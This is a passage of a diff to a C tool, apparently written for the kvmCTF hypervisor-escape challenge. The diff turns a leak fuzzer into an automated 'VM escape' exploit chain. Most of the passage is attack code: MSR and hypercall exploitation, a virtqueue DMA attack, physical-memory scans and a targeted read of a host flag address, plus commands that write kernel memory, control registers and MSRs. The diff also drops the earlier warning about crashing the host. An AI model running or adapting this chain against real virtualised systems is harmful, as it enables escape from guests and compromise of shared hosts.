+    unsigned long phys_candidates[] = {
+        flag_addr - 0xffffffff80000000UL,          /* Direct offset */
+        flag_addr - 0xffffffff80000000UL + 0x1000000,  /* +16MB */
+        (flag_addr & 0x0FFFFFFFUL),                /* Low bits only */
+        (flag_addr & 0x00FFFFFFUL),                /* 24-bit offset */
+        0
+    };
+    
+    for (int i = 0; phys_candidates[i] || i == 0; i++) {
+        if (phys_candidates[i] > 0x200000000UL) continue;  /* Skip ridiculous values */
+        
+        memset(result, 0, sizeof(result));
+        if (read_physical(phys_candidates[i], result, 64) == 0) {
+            int interesting = 0;
+            for (int j = 0; j < 64; j++) {
+                if (isprint(result[j])) interesting++;
+            }
+            
+            if (interesting > 10) {
+                safe_log("[?] Physical 0x%lx has printable content:\n", phys_candidates[i]);
+                hexdump(result, phys_candidates[i], 64);
+            }
+        }
+    }
+}
+
+/* ========================================================================
+ * CTF MAIN EXPLOIT RUNNER
+ * ======================================================================== */
+
+void run_ctf_exploit(void) {
+    safe_log("\n");
+    safe_log("╔══════════════════════════════════════════════════════════════════╗\n");
+    safe_log("║              KVMCTF VM ESCAPE EXPLOIT SUITE                      ║\n");
+    safe_log("║              Target: 0x%016lx                   ║\n", HOST_FLAG_ADDR);
+    safe_log("╚══════════════════════════════════════════════════════════════════╝\n");
+    safe_log("\n");
+    
+    /* Phase 1: Information Gathering */
+    safe_log("[PHASE 1] Information Gathering\n");
+    safe_log("═══════════════════════════════\n");
+    
+    /* Get guest kernel info */
+    unsigned long kernel_base = 0;
+    if (ioctl(fd, IOCTL_GET_KERNEL_BASE, &kernel_base) == 0) {
+        safe_log("[+] Guest kernel base: 0x%lx\n", kernel_base);
+    }
+    
+    unsigned long current_task = 0;
+    if (ioctl(fd, IOCTL_GET_CURRENT_TASK, &current_task) == 0) {
+        safe_log("[+] Current task_struct: 0x%lx\n", current_task);
+    }
+    
+    /* Read control registers */
+    unsigned long cr0 = 0, cr4 = 0;
+    unsigned long long efer = 0;
+    ioctl(fd, IOCTL_READ_CR0, &cr0);
+    ioctl(fd, IOCTL_READ_CR4, &cr4);
+    ioctl(fd, IOCTL_READ_EFER, &efer);
+    safe_log("[+] CR0=0x%lx CR4=0x%lx EFER=0x%llx\n", cr0, cr4, efer);
+    
+    /* Phase 2: MSR Exploitation */
+    safe_log("\n[PHASE 2] MSR Exploitation\n");
+    safe_log("═══════════════════════════\n");
+    msr_exploitation();
+    
+    /* Phase 3: MMIO Probing */
+    safe_log("\n[PHASE 3] MMIO Probing\n");
+    safe_log("═══════════════════════\n");
+    probe_mmio_for_host_leaks();
+    
+    /* Phase 4: Shared Memory Analysis */
+    safe_log("\n[PHASE 4] Shared Memory Analysis\n");
+    safe_log("══════════════════════════════════\n");
+    shared_memory_scan();
+    
+    /* Phase 5: Hypercall Exploitation */
+    safe_log("\n[PHASE 5] Hypercall Exploitation\n");
+    safe_log("══════════════════════════════════\n");
+    hypercall_exploitation(HOST_FLAG_ADDR);
+    
+    /* Phase 6: Virtqueue Attack */
+    safe_log("\n[PHASE 6] Virtqueue DMA Attack\n");
+    safe_log("════════════════════════════════\n");
+    virtqueue_host_memory_attack(HOST_FLAG_ADDR);
+    
+    /* Phase 7: Physical Memory Scan */
+    safe_log("\n[PHASE 7] Physical Memory Scan\n");
+    safe_log("════════════════════════════════\n");
+    scan_physical_for_host_ptrs(0x0, 0x10000000, 0x10000);  /* First 256MB */
+    
+    /* Phase 8: Targeted Attack */
+    safe_log("\n[PHASE 8] Targeted Flag Attack\n");
+    safe_log("════════════════════════════════\n");
+    attack_flag_address(HOST_FLAG_ADDR);
     
     /* Summary */
-    printf("\n=== FUZZING COMPLETE ===\n");
-    printf("[+] Total leaks found: %d\n", g_leak_count);
-    if (g_leak_count > 0) {
-        printf("[+] Leak candidates:\n");
-        for (int i = 0; i < g_leak_count && i < 20; i++) {
-            printf("    [%d] 0x%lx: ", i, g_leak_candidates[i].addr);
-            for (int j = 0; j < 8; j++) {
-                printf("%02x ", g_leak_candidates[i].data[j]);
-            }
-            printf("(%s)\n", g_leak_candidates[i].source);
-        }
-    }
+    safe_log("\n");
+    safe_log("╔══════════════════════════════════════════════════════════════════╗\n");
+    safe_log("║                        EXPLOIT SUMMARY                           ║\n");
+    safe_log("╚══════════════════════════════════════════════════════════════════╝\n");
+    safe_log("\n");
+    safe_log("[*] Total host leaks found: %d\n", g_host_leak_count);
     
-    safe_log(leak_log, "=== adaptive_vq_leak_fuzz complete: total_leaks=%d ===\n", g_leak_count);
-}
-
-/* Targeted DMA leak fuzzer */
-void adaptive_dma_leak_fuzz(int pages, int corruption) {
-    if (!leak_log) {
-        leak_log = fopen("adaptive_leak.log", "a");
-    }
-    
-    printf("=== ADAPTIVE DMA LEAK FUZZER ===\n");
-    printf("[+] Pages: %d, Starting corruption: %d%%\n", pages, corruption);
-    
-    if (pages <= 0 || pages > 16) pages = 8;
-    
-    int corruption_level = corruption;
-    
-    for (int phase = 1; phase <= 5; phase++) {
-        printf("\n[DMA PHASE %d] Corruption: %d%%\n", phase, corruption_level);
+    if (g_host_leak_count > 0) {
+        safe_log("\n[*] Top leaks by confidence:\n");
         
-        unsigned long phys_addrs[16] = {0};
-        if (ioctl(fd, IOCTL_ALLOC_ROOT_PAGES, phys_addrs) != 0) {
-            perror("ALLOC_ROOT_PAGES failed");
-            return;
-        }
-        
-        /* Write patterns with increasing corruption */
-        for (int i = 0; i < pages; i++) {
-            unsigned char buf[4096];
-            
-            if (rand() % 100 < corruption_level) {
-                /* Corrupted pattern - might trigger leaks */
-                for (int j = 0; j < 4096; j++) {
-                    if (rand() % 100 < 50) {
-                        /* Random data */
-                        buf[j] = rand() & 0xff;
-                    } else {
-                        /* Pattern that might trigger bugs */
-                        buf[j] = 0x41 + (j % 26);
-                    }
-                }
-            } else {
-                /* Clean pattern */
-                memset(buf, 0x00, sizeof(buf));
-            }
-            
-            struct physical_rw req = {
-                .phys_addr = phys_addrs[i],
-                .size = sizeof(buf),
-                .user_buffer = buf
-            };
-            
-            if (ioctl(fd, IOCTL_WRITE_PHYSICAL, &req) != 0) {
-                printf("[!] Write failed for page %d\n", i);
-                continue;
-            }
-        }
-        
-        /* Setup VQ descriptors */
-        alloc_vq_page();
-        for (int i = 0; i < pages; i++) {
-            struct vq_desc_user_data desc = {
-                .index = (uint16_t)i,
-                .phys_addr = (uint64_t)phys_addrs[i],
-                .len = 4096,
-                .flags = (rand() % 100 < corruption_level) ? (rand() & 0xffff) : 0,
-                .next_idx = (uint16_t)((i + 1) % pages)
-            };
-            ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc);
-        }
-        
-        /* Trigger and check for leaks */
-        long ret;
-        ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret);
-        
-        /* Scan all allocated pages for leaks */
-        int leaks_found = 0;
-        for (int i = 0; i < pages; i++) {
-            int found = safe_read_with_leak_check(phys_addrs[i], 4096, "dma_page");
-            leaks_found += found;
-        }
-        
-        free_vq_page();
-        
-        printf("[DMA PHASE %d] Found %d leaks\n", phase, leaks_found);
-        
-        if (!check_system_health()) {
-            printf("[!] System unstable, stopping\n");
-            break;
-        }
-        
-        corruption_level += 15;
-        sleep(1);
-    }
-    
-    printf("\n[+] DMA leak fuzzing complete\n");
-}
-
-/* Progressive memory scanner - scans with increasing depth */
-void progressive_memory_scan(unsigned long start_addr, unsigned long end_addr, 
-                            unsigned long step, int phases) {
-    if (!leak_log) {
-        leak_log = fopen("adaptive_leak.log", "a");
-    }
-    
-    printf("=== PROGRESSIVE MEMORY SCANNER ===\n");
-    printf("[+] Range: 0x%lx - 0x%lx\n", start_addr, end_addr);
-    printf("[+] Phases: %d, Step: 0x%lx\n", phases, step);
-    
-    unsigned long current_step = step;
-    
-    for (int phase = 1; phase <= phases; phase++) {
-        printf("\n[SCAN PHASE %d] Step size: 0x%lx\n", phase, current_step);
-        
-        int leaks_this_phase = 0;
-        unsigned long addr = start_addr;
-        int scanned = 0;
-        
-        while (addr < end_addr) {
-            int found = safe_read_with_leak_check(addr, 4096, "progressive_scan");
-            if (found > 0) {
-                leaks_this_phase += found;
-                printf("[+] Found %d leaks at 0x%lx\n", found, addr);
-            }
-            
-            addr += current_step;
-            scanned++;
-            
-            if (scanned % 100 == 0) {
-                printf("[.] Scanned %d addresses, found %d leaks so far\n", 
-                       scanned, leaks_this_phase);
-                
-                if (!check_system_health()) {
-                    printf("[!] System health check failed\n");
-                    return;
+        /* Sort by confidence (simple bubble sort) */
+        for (int i = 0; i < g_host_leak_count - 1; i++) {
+            for (int j = 0; j < g_host_leak_count - i - 1; j++) {
+                if (g_host_leaks[j].confidence < g_host_leaks[j+1].confidence) {
+                    struct host_leak tmp = g_host_leaks[j];
+                    g_host_leaks[j] = g_host_leaks[j+1];
+                    g_host_leaks[j+1] = tmp;
                 }
             }
         }
         
-        printf("[SCAN PHASE %d] Complete - Found %d leaks\n", phase, leaks_this_phase);
-        
-        /* Reduce step size for next phase (more granular) */
-        current_step = current_step / 2;
-        if (current_step < 0x1000) current_step = 0x1000; /* Minimum page size */
-        
-        sleep(1);
+        for (int i = 0; i < g_host_leak_count && i < 10; i++) {
+            safe_log("    [%d] addr=0x%lx value=0x%lx conf=%d src=%s\n",
+                     i, g_host_leaks[i].addr, g_host_leaks[i].leaked_value,
+                     g_host_leaks[i].confidence, g_host_leaks[i].source);
+        }
     }
     
-    printf("\n[+] Progressive scan complete - Total leaks: %d\n", g_leak_count);
-}
-
-/* Show all detected leak candidates */
-void show_leak_candidates(void) {
-    printf("=== DETECTED LEAK CANDIDATES (%d) ===\n", g_leak_count);
-    
-    if (g_leak_count == 0) {
-        printf("No leak candidates found\n");
-        return;
-    }
-    
-    for (int i = 0; i < g_leak_count; i++) {
-        struct leak_candidate *leak = &g_leak_candidates[i];
-        printf("[%d] Address: 0x%lx\n", i, leak->addr);
-        printf("     Source: %s\n", leak->source);
-        printf("     Confidence: %d\n", leak->confidence);
-        printf("     Data (first 16 bytes): ");
-        for (int j = 0; j < 16; j++) {
-            printf("%02x ", leak->data[j]);
-        }
-        printf("\n     ASCII: ");
-        for (int j = 0; j < 16; j++) {
-            unsigned char c = leak->data[j];
-            printf("%c", isprint(c) ? c : '.');
-        }
-        printf("\n");
-        
-        /* Extract potential pointer values */
-        for (int j = 0; j <= 8; j++) {
-            if (j <= 8) {
-                unsigned long value = *(unsigned long*)(leak->data + j);
-                if (looks_like_kernel_pointer(value)) {
-                    printf("     Potential pointer at offset %d: 0x%lx\n", j, value);
-                }
-            }
-        }
-        printf("\n");
-    }
-}
-
-/* Reset leak candidate list */
-void reset_leak_candidates(void) {
-    memset(g_leak_candidates, 0, sizeof(g_leak_candidates));
-    g_leak_count = 0;
+    safe_log("\n[*] Exploit run complete. Check exploit.log for details.\n");
 }
 
 /* ========================================================================
- * SECTION 7: HELP FUNCTION
+ * INDIVIDUAL COMMANDS (for interactive use)
  * ======================================================================== */
+
+void show_leaks(void) {
+    printf("=== HOST LEAKS (%d total) ===\n", g_host_leak_count);
+    for (int i = 0; i < g_host_leak_count; i++) {
+        printf("[%d] addr=0x%lx value=0x%lx conf=%d src=%s\n",
+               i, g_host_leaks[i].addr, g_host_leaks[i].leaked_value,
+               g_host_leaks[i].confidence, g_host_leaks[i].source);
+    }
+}
 
 void print_help(void) {
     printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
-    printf("║                   KVMCTF EXPLOITATION TOOL - v2.0                     ║\n");
+    printf("║               KVMCTF EXPLOIT TOOL - VM ESCAPE EDITION                 ║\n");
     printf("╚═══════════════════════════════════════════════════════════════════════╝\n\n");
+    
+    printf("AUTOMATED EXPLOITS:\n");
+    printf("  run_exploit                          - Run full exploit chain\n");
+    printf("  attack_flag [addr]                   - Target specific flag address\n");
+    printf("                                         Default: 0x%lx\n", HOST_FLAG_ADDR);
     printf("\n");
-
-    printf("CORE OPERATIONS:\n");
-    printf("  ────────────────────────────────────────────────────────────────────────\n");
-    printf("  help                                                     - Show this help message\n");
-    printf("  init                                                     - Initialize connection to driver\n");
-    printf("  status                                                   - Check driver status\n");
-    printf("  alloc_vq_page                                            - Allocate virtqueue page\n");
-    printf("  free_vq_page                                             - Free virtqueue page\n");
-    printf("  crash_monitor start/stop                                 - Monitor kernel logs for crashes\n");
-    printf("  kaslr                                                    - Get KASLR slide offset\n");
-    printf("  kernel_base                                              - Get kernel base address\n");
-    printf("  current_task                                             - Get current task_struct address\n");
-    printf("  lookup <symbol>                                          - Lookup kernel symbol address\n");
-    printf("            Example: kvm_prober lookup init_task\n");
+    
+    printf("INFORMATION GATHERING:\n");
+    printf("  probe_mmio                           - Scan MMIO for host leaks\n");
+    printf("  scan_msrs                            - Check MSRs for host info\n");
+    printf("  scan_shared                          - Analyze shared memory regions\n");
+    printf("  scan_phys <start> <end> [step]       - Scan physical memory\n");
+    printf("  show_leaks                           - Display found host leaks\n");
     printf("\n");
-
-    printf("REGISTER & PROTECTION OPERATIONS:\n");
-    printf("  ────────────────────────────────────────────────────────────────────────\n");
-    printf("  read_efer                                                - Read EFER register\n");
-    printf("  read_cr0/cr4                                             - Read control registers\n");
-    printf("  write_cr0/cr4 <value>                                    - Write control registers\n");
-    printf("  enable_smep/smap/wp                                      - Enable protections\n");
-    printf("  enable_nx/disable_nx                                     - Control NX bit\n");
-    printf("  escalate                                                 - Attempt privilege escalation\n");
-    printf("            Example: kvm_prober write_cr0 0x80050033\n");
-    printf("  read_msr <msr>                                           - Read MSR\n");
-    printf("            Example: kvm_prober read_msr 0xC0000080\n");
-    printf("  write_msr <msr> <value>                                  - Write MSR\n");
-    printf("            Example: kvm_prober write_msr 0xC0000080 0x12345678\n");
-    printf("  virt_to_phys <va>                                        - Translate virtual address to physical\n");
-    printf("            Example: kvm_prober virt_to_phys 0xffff888000000000\n");
-    printf("  trigger_hypercall                                        - Trigger default hypercall\n");
-    printf("            Example: kvm_prober trigger_hypercall\n");
-    printf("  NOTE: Hypercalls are now automatically triggered after every operation\n");
-    printf("  NOTE: SMEP/SMAP/WP are automatically disabled before all read/write ops\n");
+    
+    printf("ATTACK VECTORS:\n");
+    printf("  vq_attack [addr]                     - Virtqueue DMA confusion\n");
+    printf("  hypercall_attack [addr]              - Hypercall exploitation\n");
     printf("\n");
-
-    printf("AUTOMATION HARNESSES:\n");
-    printf("  ────────────────────────────────────────────────────────────────────────\n");
-    printf("  vq_fuzz <iter> <max_idx> <mode> [trigger]                - Fuzz virtqueue descriptors\n");
-    printf("            Example: kvm_prober vq_fuzz 100 64 random crash\n");
-    printf("  dma_probe <pages> <pattern> <trigger>                    - Allocate physical pages and create DMA descriptors\n");
-    printf("            Example: kvm_prober dma_probe 16 deadbeef crash\n");
-    printf("  msr_fuzz <start> <end> <patterns_mask>                   - Fuzz Model-Specific Registers\n");
-    printf("            Example: kvm_prober msr_fuzz 0x0 0x100 0xff\n");
-    printf("  v2p_fast <phys> [start] [end] [step] [progress]          - Fast scan virtual→physical mappings\n");
-    printf("            Example: kvm_prober v2p_fast 0x100000 0x200000 0x1000 yes\n");
-    printf("  adaptive_vq_fuzz  <max_iter> [corruption_%%]              - Gradually increase VQ corruption until leaks are detected\n");
-    printf("            Example: kvm_prober adaptive_vq_fuzz 1000 10\n");
-    printf("  adaptive_dma_fuzz <pages> [corruption_%%]                 - DMA-based adaptive fuzzing with leak detection\n");
-    printf("            Example: kvm_prober adaptive_dma_fuzz 8 20\n");
-    printf("  progressive_scan <start> <end> [step] [phases]           - Multi-phase memory scan with increasing granularity\n");
-    printf("            Example: kvm_prober progressive_scan 0x1000000 0x2000000 0x10000 5\n");
-    printf("  show_leaks                                               - Display all detected leak candidates\n");
-    printf("            Example: kvm_prober show_leaks\n");
-    printf("  reset_leaks                                              - Clear leak candidate list\n");
-    printf("            Example: kvm_prober reset_leaks\n");
+    
+    printf("BASIC OPERATIONS:\n");
+    printf("  read_phys <addr> <size>              - Read physical memory\n");
+    printf("  read_mmio <addr> <size>              - Read MMIO region\n");
+    printf("  read_kernel <addr> <size>            - Read kernel memory\n");
+    printf("  write_phys <addr> <hex>              - Write physical memory\n");
+    printf("  hypercall <nr> [a0] [a1] [a2] [a3]   - Execute hypercall\n");
     printf("\n");
-
-    printf("READ/WRITE/SCAN OPERATIONS:\n");
-    printf("  ────────────────────────────────────────────────────────────────────────\n");
-    printf("  read_phys <addr> <size>                                  - Read physical memory\n");
-    printf("            Example: kvm_prober read_phys 0x100000 64\n");
-    printf("  read_kernel <addr> <size>                                - Read kernel virtual memory\n");
-    printf("            Example: kvm_prober read_kernel 0xffffffff81000000 128\n");
-    printf("  read_mmio <addr> <size>                                  - Read MMIO region\n");
-    printf("            Example: kvm_prober read_mmio 0xfe000000 16\n");
-    printf("  write_kernel <addr> <hex_data>                           - Write to kernel virtual memory\n");
-    printf("            Example: kvm_prober write_kernel 0xffffffff81000000 deadbeef\n");
-    printf("  write_phys <addr> <hex_data>                             - Write to physical memory\n");
-    printf("            Example: kvm_prober write_phys 0x100000 cafebabe\n");
-    printf("  write_mmio <addr> <val>                                  - Write to MMIO region\n");
-    printf("            Example: kvm_prober write_mmio 0xfe000000 0x1\n");
-    printf("  scan_phys <start> <end>                                  - Scan physical memory range\n");
-    printf("            Example: kvm_prober scan_phys 0x100000 0x200000\n");
-    printf("  scan_kernel <start> <end>                                - Scan kernel virtual memory range\n");
-    printf("            Example: kvm_prober scan_kernel 0xffffffff81000000 0xffffffff82000000\n");
-    printf("  scan_mmio  <start> <end>                                 - Scan MMIO region\n");
-    printf("            Example: kvm_prober scan_mmio 0xfe000000 0xfe100000\n");
-    printf("  write_port <port> <val>                                  - Write to I/O port\n");
-    printf("            Example: kvm_prober write_port 0x3f8 0x41\n");
-    printf("  read_port <port>                                         - Read from I/O port\n");
-    printf("            Example: kvm_prober read_port 0x3f8\n");
-    printf("  patch <addr> <hex_data>                                  - Patch memory at given address\n");
-    printf("            Example: kvm_prober patch 0xffffffff81000000 9090\n");
+    
+    printf("REGISTER OPERATIONS:\n");
+    printf("  read_cr0 / read_cr4 / read_efer      - Read control registers\n");
+    printf("  read_msr <msr>                       - Read MSR\n");
+    printf("  kaslr                                - Show KASLR slide\n");
     printf("\n");
-    printf("      ***OPTIONS***\n");
-    printf("  -trigger <trigger word/hex>: Show only lines matching ASCII or hex pattern (little-endian)\n");
-    printf("  -head <num>: Show N bytes before trigger match (default: 0)\n");
-    printf("  -tail <num>: Show N bytes after trigger match (default: 0)\n");
-    printf("\n");
-
-    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
-    printf("║                            WARNING                                    ║\n");
-    printf("║  These operations can CRASH, CORRUPT, or DESTABILIZE the host system. ║\n");
-    printf("║  Use ONLY on dedicated test systems with appropriate authorization.   ║\n");
-    printf("╚═══════════════════════════════════════════════════════════════════════╝\n");
 }
 
 /* ========================================================================
- * SECTION 8: MAIN FUNCTION
+ * MAIN
  * ======================================================================== */
 
 int main(int argc, char *argv[]) {
@@ -1759,481 +1024,188 @@ int main(int argc, char *argv[]) {
         print_help();
         return 1;
     }
-
+    
     if (strcmp(argv[1], "help") == 0) {
         print_help();
         return 0;
     }
-
+    
     if (init_driver() < 0) {
         return 1;
     }
-
-    char *command = argv[1];
-
-    /* Core commands */
-    if (strcmp(command, "init") == 0) {
-        printf("[+] Already initialized\n");
+    
+    char *cmd = argv[1];
+    
+    /* Automated exploits */
+    if (strcmp(cmd, "run_exploit") == 0) {
+        run_ctf_exploit();
     }
-    else if (strcmp(command, "virt_to_phys") == 0) {
-        if (argc < 3) {
-            printf("Usage: virt_to_phys <virtual_address>\n");
-        } else {
-            unsigned long va = strtoul(argv[2], NULL, 0);
-            virt_to_phys(va);
-        }
-    }
-    else if (strcmp(command, "alloc_vq_page") == 0) {
-        alloc_vq_page();
-    }
-    else if (strcmp(command, "free_vq_page") == 0) {
-        free_vq_page();
+    else if (strcmp(cmd, "attack_flag") == 0) {
+        unsigned long addr = HOST_FLAG_ADDR;
+        if (argc > 2) addr = strtoul(argv[2], NULL, 0);
+        attack_flag_address(addr);
     }
     
-    /* Register operations */
-    else if (strcmp(command, "read_efer") == 0) {
-        read_efer();
+    /* Information gathering */
+    else if (strcmp(cmd, "probe_mmio") == 0) {
+        probe_mmio_for_host_leaks();
     }
-    else if (strcmp(command, "enable_nx") == 0) {
-        enable_nx();
+    else if (strcmp(cmd, "scan_msrs") == 0) {
+        msr_exploitation();
     }
-    else if (strcmp(command, "disable_nx") == 0) {
-        disable_nx();
+    else if (strcmp(cmd, "scan_shared") == 0) {
+        shared_memory_scan();
     }
-    else if (strcmp(command, "read_cr0") == 0) {
-        read_cr0();
-    }
-    else if (strcmp(command, "write_cr0") == 0) {
-        if (argc < 3) {
-            printf("Usage: write_cr0 <value>\n");
-        } else {
-            unsigned long value = strtoul(argv[2], NULL, 0);
-            write_cr0(value);
-        }
-    }
-    else if (strcmp(command, "read_cr4") == 0) {
-        read_cr4();
-    }
-    else if (strcmp(command, "write_cr4") == 0) {
-        if (argc < 3) {
-            printf("Usage: write_cr4 <value>\n");
-        } else {
-            unsigned long value = strtoul(argv[2], NULL, 0);
-            write_cr4(value);
-        }
-    }
-    else if (strcmp(command, "read_msr") == 0) {
-        if (argc < 3) {
-            printf("Usage: read_msr <msr_number>\n");
-        } else {
-            unsigned int msr = (unsigned int)strtoul(argv[2], NULL, 0);
-            read_msr(msr);
-        }
-    }
-    else if (strcmp(command, "write_msr") == 0) {
+    else if (strcmp(cmd, "scan_phys") == 0) {
         if (argc < 4) {
-            printf("Usage: write_msr <msr_number> <value>\n");
-        } else {
-            unsigned int msr = (unsigned int)strtoul(argv[2], NULL, 0);
-            unsigned long long value = strtoull(argv[3], NULL, 0);
-            write_msr(msr, value);
-        }
-    }
-    else if (strcmp(command, "enable_smep") == 0) {
-        enable_smep();
-    }
-    else if (strcmp(command, "enable_smap") == 0) {
-        enable_smap();
-    }
-    else if (strcmp(command, "enable_wp") == 0) {
-        enable_wp();
-    }
-    
-    /* Memory read operations with trigger support */
-    else if (strcmp(command, "read_kernel") == 0) {
-        if (argc < 4) {
-            printf("Usage: read_kernel <address> <size> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
-        } else {
-            unsigned long addr = strtoul(argv[2], NULL, 0);
-            unsigned long size = strtoul(argv[3], NULL, 0);
-            const char *trigger = NULL;
-            unsigned long head = 0, tail = 0;
-            
-            for (int i = 4; i < argc; i++) {
-                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
-                    trigger = argv[++i];
-                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
-                    head = strtoul(argv[++i], NULL, 0);
-                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
-                    tail = strtoul(argv[++i], NULL, 0);
-                }
-            }
-            
-            read_kernel_mem(addr, size, trigger, head, tail);
-        }
-    }
-    else if (strcmp(command, "read_phys") == 0) {
-        if (argc < 4) {
-            printf("Usage: read_phys <address> <size> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
-        } else {
-            unsigned long addr = strtoul(argv[2], NULL, 0);
-            unsigned long size = strtoul(argv[3], NULL, 0);
-            const char *trigger = NULL;
-            unsigned long head = 0, tail = 0;
-            
-            for (int i = 4; i < argc; i++) {
-                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
-                    trigger = argv[++i];
-                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
-                    head = strtoul(argv[++i], NULL, 0);
-                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
-                    tail = strtoul(argv[++i], NULL, 0);
-                }
-            }
-            
-            read_physical_mem(addr, size, trigger, head, tail);
-        }
-    }
-    else if (strcmp(command, "read_mmio") == 0) {
-        if (argc < 4) {
-            printf("Usage: read_mmio <address> <size> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
-        } else {
-            unsigned long addr = strtoul(argv[2], NULL, 0);
-            unsigned long size = strtoul(argv[3], NULL, 0);
-            const char *trigger = NULL;
-            unsigned long head = 0, tail = 0;
-            
-            for (int i = 4; i < argc; i++) {
-                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
-                    trigger = argv[++i];
-                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
-                    head = strtoul(argv[++i], NULL, 0);
-                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
-                    tail = strtoul(argv[++i], NULL, 0);
-                }
-            }
-            
-            read_mmio(addr, size, trigger, head, tail);
-        }
-    }
-    
-    /* Scan operations */
-    else if (strcmp(command, "scan_phys") == 0) {
-        if (argc < 4) {
-            printf("Usage: scan_phys <start> <end> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
-        } else {
-            unsigned long start = strtoul(argv[2], NULL, 0);
-            unsigned long end = strtoul(argv[3], NULL, 0);
-            const char *trigger = NULL;
-            unsigned long head = 0, tail = 0;
-            
-            for (int i = 4; i < argc; i++) {
-                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
-                    trigger = argv[++i];
-                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
-                    head = strtoul(argv[++i], NULL, 0);
-                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
-                    tail = strtoul(argv[++i], NULL, 0);
-                }
-            }
-            
-            scan_physical_mem(start, end, trigger, head, tail);
-        }
-    }
-    else if (strcmp(command, "scan_kernel") == 0) {
-        if (argc < 4) {
-            printf("Usage: scan_kernel <start> <end> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
-        } else {
-            unsigned long start = strtoul(argv[2], NULL, 0);
-            unsigned long end = strtoul(argv[3], NULL, 0);
-            const char *trigger = NULL;
-            unsigned long head = 0, tail = 0;
-            
-            for (int i = 4; i < argc; i++) {
-                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
-                    trigger = argv[++i];
-                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
-                    head = strtoul(argv[++i], NULL, 0);
-                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
-                    tail = strtoul(argv[++i], NULL, 0);
-                }
-            }
-            
-            scan_kernel_mem(start, end, trigger, head, tail);
-        }
-    }
-    else if (strcmp(command, "scan_mmio") == 0) {
-        if (argc < 4) {
-            printf("Usage: scan_mmio <start> <end> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
-        } else {
-            unsigned long start = strtoul(argv[2], NULL, 0);
-            unsigned long end = strtoul(argv[3], NULL, 0);
-            const char *trigger = NULL;
-            unsigned long head = 0, tail = 0;
-            
-            for (int i = 4; i < argc; i++) {
-                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
-                    trigger = argv[++i];
-                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
-                    head = strtoul(argv[++i], NULL, 0);
-                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
-                    tail = strtoul(argv[++i], NULL, 0);
-                }
-            }
-            
-            scan_mmio(start, end, trigger, head, tail);
-        }
-    }
-    
-    /* Write operations */
-    else if (strcmp(command, "write_kernel") == 0) {
-        if (argc < 4) {
-            printf("Usage: write_kernel <address> <hex_data>\n");
-        } else {
-            unsigned long addr = strtoul(argv[2], NULL, 0);
-            char *hex_data = argv[3];
-            size_t len = strlen(hex_data);
-            if (len % 2 != 0) {
-                printf("Error: Hex data must have even number of characters\n");
-                return 1;
-            }
-            size_t data_len = len / 2;
-            unsigned char *data = malloc(data_len);
-            for (size_t i = 0; i < data_len; i++) {
-                sscanf(hex_data + 2*i, "%2hhx", &data[i]);
-            }
-            write_kernel_mem(addr, data, data_len);
-            free(data);
-        }
-    }
-    else if (strcmp(command, "write_phys") == 0) {
-        if (argc < 4) {
-            printf("Usage: write_phys <address> <hex_data>\n");
-        } else {
-            unsigned long addr = strtoul(argv[2], NULL, 0);
-            char *hex_data = argv[3];
-            size_t len = strlen(hex_data);
-            if (len % 2 != 0) {
-                printf("Error: Hex data must have even number of characters\n");
-                return 1;
-            }
-            size_t data_len = len / 2;
-            unsigned char *data = malloc(data_len);
-            for (size_t i = 0; i < data_len; i++) {
-                sscanf(hex_data + 2*i, "%2hhx", &data[i]);
-            }
-            write_physical_mem(addr, data, data_len);
-            free(data);
-        }
-    }
-    else if (strcmp(command, "patch") == 0) {
-        if (argc < 4) {
-            printf("Usage: patch <address> <hex_data>\n");
-        } else {
-            unsigned long addr = strtoul(argv[2], NULL, 0);
-            char *hex_data = argv[3];
-            size_t len = strlen(hex_data);
-            if (len % 2 != 0) {
-                printf("Error: Hex data must have even number of characters\n");
-                return 1;
-            }
-            size_t data_len = len / 2;
-            unsigned char *data = malloc(data_len);
-            for (size_t i = 0; i < data_len; i++) {
-                sscanf(hex_data + 2*i, "%2hhx", &data[i]);
-            }
-            patch_kernel(addr, data, data_len);
-            free(data);
-        }
-    }
-    else if (strcmp(command, "write_mmio") == 0) {
-        if (argc < 5) {
-            printf("Usage: write_mmio <address> <size> <value>\n");
-        } else {
-            unsigned long addr = strtoul(argv[2], NULL, 0);
-            unsigned long size = strtoul(argv[3], NULL, 0);
-            unsigned long value = strtoul(argv[4], NULL, 0);
-            write_mmio(addr, size, value);
-        }
-    }
-    
-    /* I/O operations */
-    else if (strcmp(command, "read_port") == 0) {
-        if (argc < 4) {
-            printf("Usage: read_port <port> <size>\n");
-        } else {
-            unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
-            unsigned int size = (unsigned int)strtoul(argv[3], NULL, 0);
-            read_port(port, size);
-        }
-    }
-    else if (strcmp(command, "write_port") == 0) {
-        if (argc < 5) {
-            printf("Usage: write_port <port> <size> <value>\n");
-        } else {
